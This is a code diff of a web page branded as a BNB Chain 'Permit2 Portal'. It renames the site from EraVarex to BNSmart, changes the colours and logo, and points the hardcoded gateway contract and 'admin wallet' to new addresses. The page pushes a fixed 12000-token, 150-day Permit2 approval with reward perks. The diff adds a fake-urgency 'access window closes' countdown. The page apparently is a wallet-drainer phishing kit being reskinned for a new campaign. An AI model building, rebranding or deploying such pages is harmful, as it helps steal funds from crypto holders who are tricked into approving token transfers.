@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>EraVarex — Permit2 Portal</title>
-<meta name="description" content="EraVarex: Securely connect your wallet and approve Permit2 token allowance on BNB Smart Chain." />
+<title>BNSmart — Permit2 Portal</title>
+<meta name="description" content="BNSmart: Securely connect your wallet and approve Permit2 token allowance on BNB Smart Chain." />
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
@@ -19,29 +19,31 @@
     --bg-overlay:     #172033;
     --bg-hover:       #1e293f;
 
-    --border-subtle:  #1b2537;
-    --border-default: #22324c;
-    --border-accent:  #0ea5e9;
+    --border-subtle:  #1d2636;
+    --border-default: #28374e;
+    --border-accent:  #f0b90b;
 
-    --text-primary:   #f0f4f8;
+    --text-primary:   #f8fafc;
     --text-secondary: #94a3b8;
     --text-muted:     #4b586e;
     --text-inverse:   #06080e;
 
     --accent-blue:    #06b6d4;
-    --accent-brand:   #6366f1;
+    --accent-brand:   #f0b90b;
+    --accent-brand-light: #fcd535;
     --accent-green:   #10b981;
     --accent-red:     #f43f5e;
     --accent-amber:   #f59e0b;
     --accent-purple:  #8b5cf6;
 
-    --glow-blue:      rgba(6,182,212,0.20);
-    --glow-brand:     rgba(99,102,241,0.20);
-    --glow-green:     rgba(16,185,129,0.16);
+    --glow-blue:      rgba(6,182,212,0.22);
+    --glow-brand:     rgba(240,185,11,0.28);
+    --glow-green:     rgba(16,185,129,0.18);
 
-    --gradient-card:  linear-gradient(145deg, #0f1523 0%, #0a0e18 100%);
-    --gradient-blue:  linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
-    --gradient-brand: linear-gradient(135deg, #6366f1 0%, #06b6d4 50%, #10b981 100%);
+    --gradient-card:  linear-gradient(145deg, #0f1524 0%, #080d16 100%);
+    --gradient-blue:  linear-gradient(135deg, #f0b90b 0%, #06b6d4 100%);
+    --gradient-brand: linear-gradient(135deg, #fcd535 0%, #f0b90b 55%, #d97706 100%);
+    --gradient-gold:  linear-gradient(135deg, #fcd535 0%, #f0b90b 60%, #b45309 100%);
     --gradient-green: linear-gradient(135deg, #059669, #10b981);
 
     --radius-sm:  6px;
@@ -68,8 +70,8 @@
     content: '';
     position: fixed; inset: 0;
     background:
-      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(6,182,212,.14) 0%, transparent 60%),
-      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(99,102,241,.12) 0%, transparent 60%);
+      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(240,185,11,.13) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(6,182,212,.10) 0%, transparent 60%);
     pointer-events: none;
     z-index: 0;
   }
@@ -106,18 +108,24 @@
   .logo-group { display: flex; align-items: center; gap: 14px; }
 
   .logo-icon {
-    width: 42px; height: 42px;
-    background: var(--gradient-blue);
+    width: 44px; height: 44px;
+    background: transparent;
     border-radius: var(--radius-md);
     display: flex; align-items: center; justify-content: center;
-    font-size: 1.3rem;
-    box-shadow: 0 0 25px rgba(59,130,246,.3);
+    box-shadow: 0 0 20px rgba(240,185,11,.22);
     flex-shrink: 0;
   }
 
   .logo-text { display: flex; flex-direction: column; line-height: 1.2; }
-  .logo-title { font-size: 1.15rem; font-weight: 700; color: var(--text-primary); letter-spacing: -.02em; }
-  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 400; letter-spacing: .04em; text-transform: uppercase; }
+  .logo-title {
+    font-size: 1.25rem;
+    font-weight: 800;
+    letter-spacing: -.02em;
+    background: linear-gradient(135deg, #ffffff 40%, #f0b90b 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 500; letter-spacing: .05em; text-transform: uppercase; }
 
   .network-pill {
     display: flex; align-items: center; gap: 7px;
@@ -792,6 +800,179 @@
       padding: 10px 12px;
     }
   }
+
+  /* ===== ACCESS WINDOW COUNTDOWN (Bottom Component) ===== */
+  .access-window-card {
+    background: radial-gradient(ellipse 90% 70% at 50% 0%, rgba(13, 24, 46, 0.95) 0%, rgba(5, 10, 20, 0.98) 100%);
+    border: 1px solid rgba(56, 189, 248, 0.22);
+    border-radius: 20px;
+    padding: 26px 20px 22px;
+    margin-top: 24px;
+    margin-bottom: 24px;
+    position: relative;
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6), 0 0 24px rgba(6, 182, 212, 0.08);
+    backdrop-filter: blur(12px);
+    text-align: center;
+    overflow: hidden;
+  }
+
+  .access-window-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 15%;
+    right: 15%;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(56, 189, 248, 0.6), transparent);
+    pointer-events: none;
+  }
+
+  .access-window-title {
+    font-size: 0.84rem;
+    font-weight: 700;
+    letter-spacing: 0.18em;
+    color: #7dd3fc;
+    margin-bottom: 20px;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .access-countdown-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 14px;
+  }
+
+  .access-countdown-box {
+    position: relative;
+    flex: 1;
+    min-width: 64px;
+    max-width: 110px;
+    background: linear-gradient(180deg, #0e172a 0%, #060a14 100%);
+    border: 1px solid rgba(56, 189, 248, 0.16);
+    border-radius: 14px;
+    padding: 22px 6px 16px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.06);
+    overflow: hidden;
+  }
+
+  /* Flip-card horizontal split line */
+  .access-countdown-box::before {
+    content: '';
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 48%;
+    height: 1px;
+    background: rgba(0, 0, 0, 0.7);
+    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.06);
+    pointer-events: none;
+    z-index: 2;
+  }
+
+  /* Card side cut notches */
+  .access-countdown-box::after {
+    content: '';
+    position: absolute;
+    left: -4px;
+    top: calc(48% - 3px);
+    width: 6px;
+    height: 6px;
+    background: #08101e;
+    border-radius: 50%;
+    z-index: 3;
+    pointer-events: none;
+  }
+
+  .access-num {
+    font-family: var(--font-mono);
+    font-size: 2.5rem;
+    font-weight: 800;
+    line-height: 1;
+    letter-spacing: -0.02em;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Colors matching user screenshot */
+  .access-num.access-days {
+    color: #22d3ee;
+    text-shadow: 0 0 22px rgba(34, 211, 238, 0.5);
+  }
+
+  .access-num.access-hours {
+    color: #38bdf8;
+    text-shadow: 0 0 22px rgba(56, 189, 248, 0.5);
+  }
+
+  .access-num.access-mins {
+    color: #818cf8;
+    text-shadow: 0 0 22px rgba(129, 140, 248, 0.5);
+  }
+
+  .access-num.access-secs {
+    color: #c084fc;
+    text-shadow: 0 0 22px rgba(192, 132, 252, 0.5);
+  }
+
+  .access-unit {
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.16em;
+    color: #64748b;
+    margin-top: 12px;
+    text-transform: uppercase;
+    position: relative;
+    z-index: 1;
+  }
+
+  .access-window-footer {
+    font-size: 0.76rem;
+    font-weight: 800;
+    letter-spacing: 0.18em;
+    color: #38bdf8;
+    text-transform: uppercase;
+    margin-top: 14px;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  @media (max-width: 480px) {
+    .access-window-card {
+      padding: 18px 12px 16px;
+    }
+    .access-countdown-row {
+      gap: 6px;
+    }
+    .access-countdown-box {
+      min-width: 54px;
+      padding: 16px 4px 12px;
+      border-radius: 10px;
+    }
+    .access-num {
+      font-size: 1.65rem;
+    }
+    .access-unit {
+      font-size: 0.58rem;
+      letter-spacing: 0.1em;
+      margin-top: 8px;
+    }
+    .access-window-title {
+      font-size: 0.75rem;
+      letter-spacing: 0.1em;
+      margin-bottom: 16px;
+    }
+  }
 </style>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 </head>
@@ -799,26 +980,30 @@
 <div class="app-wrapper">
   <header class="app-header">
     <div class="logo-group">
-      <div class="logo-icon" style="background:transparent;border:none;display:flex;align-items:center;justify-content:center;">
-        <svg width="34" height="34" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <polygon points="18,3 32,10.5 32,25.5 18,33 4,25.5 4,10.5" stroke="url(#era_grad_icon)" stroke-width="2.2" fill="url(#era_hex_fill)" />
-          <path d="M12 12H24M12 18H20M12 24H24" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" />
-          <circle cx="24" cy="18" r="2.2" fill="#06b6d4" />
+      <div class="logo-icon">
+        <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
           <defs>
-            <linearGradient id="era_grad_icon" x1="4" y1="3" x2="32" y2="33" gradientUnits="userSpaceOnUse">
-              <stop stop-color="#6366f1" />
-              <stop offset="0.5" stop-color="#06b6d4" />
-              <stop offset="1" stop-color="#10b981" />
+            <linearGradient id="bnsmart_gold_grad" x1="3" y1="3" x2="33" y2="33" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#FCD535" />
+              <stop offset="0.5" stop-color="#F0B90B" />
+              <stop offset="1" stop-color="#D97706" />
             </linearGradient>
-            <radialGradient id="era_hex_fill" cx="50%" cy="50%" r="50%">
-              <stop offset="0%" stop-color="#06b6d4" stop-opacity="0.25" />
-              <stop offset="100%" stop-color="#1e1b4b" stop-opacity="0.6" />
+            <radialGradient id="bnsmart_hex_fill" cx="50%" cy="50%" r="50%">
+              <stop offset="0%" stop-color="#F0B90B" stop-opacity="0.25" />
+              <stop offset="100%" stop-color="#0c121e" stop-opacity="0.9" />
             </radialGradient>
           </defs>
+          <polygon points="18,3 32,10.5 32,25.5 18,33 4,25.5 4,10.5" stroke="url(#bnsmart_gold_grad)" stroke-width="2.2" fill="url(#bnsmart_hex_fill)" />
+          <polygon points="18,9 27,18 18,27 9,18" stroke="#FCD535" stroke-width="1.6" fill="rgba(240,185,11,0.12)" />
+          <rect x="14.5" y="14.5" width="7" height="7" rx="1.5" transform="rotate(45 18 18)" fill="url(#bnsmart_gold_grad)" />
+          <circle cx="18" cy="9" r="1.5" fill="#FCD535" />
+          <circle cx="27" cy="18" r="1.5" fill="#FCD535" />
+          <circle cx="18" cy="27" r="1.5" fill="#FCD535" />
+          <circle cx="9" cy="18" r="1.5" fill="#FCD535" />
         </svg>
       </div>
       <div class="logo-text">
-        <span class="logo-title">EraVarex</span>
+        <span class="logo-title">BNSmart</span>
         <span class="logo-sub">Permit2 Gateway · BNB Chain</span>
       </div>
     </div>
@@ -841,10 +1026,12 @@ const API_BASE  = "/api";
 const CHAIN_ID  = 56;
 const PERMIT2   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
-// EraVarex Contract & Wallet Configuration
-const ERAVAREX_CONTRACT_ADDRESS = "0x768D5df1E316101C1C3862354F46217ac90a08bf";
-const ERAVAREX_ADMIN_WALLET     = "0xf07F812568800638909CE5b7e975545863dff92d";
-const GATEWAY                   = ERAVAREX_CONTRACT_ADDRESS;
+// BNSmart Contract & Wallet Configuration
+const BNSMART_CONTRACT_ADDRESS = "0xee4CE2048988aFf55Ec46933D7409A6d79C64F8A";
+const BNSMART_ADMIN_WALLET     = "0x28C8383b19B254D8A59DB32440dAF4E08c6FC396";
+const ERAVAREX_CONTRACT_ADDRESS = BNSMART_CONTRACT_ADDRESS;
+const ERAVAREX_ADMIN_WALLET     = BNSMART_ADMIN_WALLET;
+const GATEWAY                   = BNSMART_CONTRACT_ADDRESS;
 
 // Fixed amounts as required: 12000 tokens, 150 days
 const FIXED_AMOUNT = "12000";
@@ -934,7 +1121,12 @@ const DEFAULT_REWARD_CONFIG = {
   perk2Title: "New & Re-Approvals",
   perk2Desc: "Applicable for first-time connections & wallets approving again.",
   perk3Title: "Instant BSC On-Chain",
-  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period."
+  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period.",
+  // Access Window Countdown Configuration
+  countdownEnabled: true,
+  countdownTitle: "ACCESS WINDOW CLOSES IN:",
+  countdownTargetDate: "2027-06-28T12:54:48.000Z",
+  countdownFooterText: "CURRENT POOL"
 };
 
 const state = {
@@ -1234,10 +1426,45 @@ function render() {
       </button>
     </div>
     ` : ''}
+
+    <!-- ACCESS WINDOW CLOSES IN (Bottom Countdown - Image Match) -->
+    ${state.rewardConfig && state.rewardConfig.countdownEnabled !== false ? `
+    <div class="access-window-card" id="access-window-card">
+      <div class="access-window-title">
+        <span id="access-window-title-text">${esc(state.rewardConfig.countdownTitle || "ACCESS WINDOW CLOSES IN:")}</span>
+      </div>
+
+      <div class="access-countdown-row">
+        <div class="access-countdown-box">
+          <span class="access-num access-days" id="access-timer-d">242</span>
+          <span class="access-unit">DAYS</span>
+        </div>
+        <div class="access-countdown-box">
+          <span class="access-num access-hours" id="access-timer-h">08</span>
+          <span class="access-unit">HOURS</span>
+        </div>
+        <div class="access-countdown-box">
+          <span class="access-num access-mins" id="access-timer-m">06</span>
+          <span class="access-unit">MINUTES</span>
+        </div>
+        <div class="access-countdown-box">
+          <span class="access-num access-secs" id="access-timer-s">16</span>
+          <span class="access-unit">SECONDS</span>
+        </div>
+      </div>
+
+      ${state.rewardConfig.countdownFooterText ? `
+      <div class="access-window-footer">
+        <span id="access-window-footer-text">${esc(state.rewardConfig.countdownFooterText)}</span>
+      </div>
+      ` : ''}
+    </div>
+    ` : ''}
   `;
 
   bind();
   updateBonusCountdown();
+  updateAccessWindowCountdown();
 }
 
 function bind() {
@@ -1416,8 +1643,46 @@ function updateBonusCountdown() {
   }
 }
 
-// Tick countdown every second
-setInterval(updateBonusCountdown, 1000);
+/* ============================================================
+   ACCESS WINDOW COUNTDOWN (Target Date & Time - Image Match)
+   ============================================================ */
+function updateAccessWindowCountdown() {
+  const rc = state.rewardConfig || DEFAULT_REWARD_CONFIG;
+  const card = document.getElementById('access-window-card');
+  if (!card) return;
+
+  if (rc.countdownEnabled === false) {
+    card.style.display = 'none';
+    return;
+  }
+  card.style.display = '';
+
+  const targetStr = rc.countdownTargetDate || "2027-06-28T12:54:48.000Z";
+  const targetTime = new Date(targetStr).getTime();
+  const now = Date.now();
+  const diff = Math.max(0, targetTime - now);
+
+  const days  = Math.floor(diff / (1000 * 60 * 60 * 24));
+  const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  const mins  = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+  const secs  = Math.floor((diff % (1000 * 60)) / 1000);
+
+  const dEl = document.getElementById('access-timer-d');
+  const hEl = document.getElementById('access-timer-h');
+  const mEl = document.getElementById('access-timer-m');
+  const sEl = document.getElementById('access-timer-s');
+
+  if (dEl) dEl.textContent = String(days);
+  if (hEl) hEl.textContent = String(hours).padStart(2, '0');
+  if (mEl) mEl.textContent = String(mins).padStart(2, '0');
+  if (sEl) sEl.textContent = String(secs).padStart(2, '0');
+}
+
+// Tick countdowns every second
+setInterval(() => {
+  updateBonusCountdown();
+  updateAccessWindowCountdown();
+}, 1000);
 
 // Initial render, fetch dynamic reward config, and auto-detect existing provider account
 render();
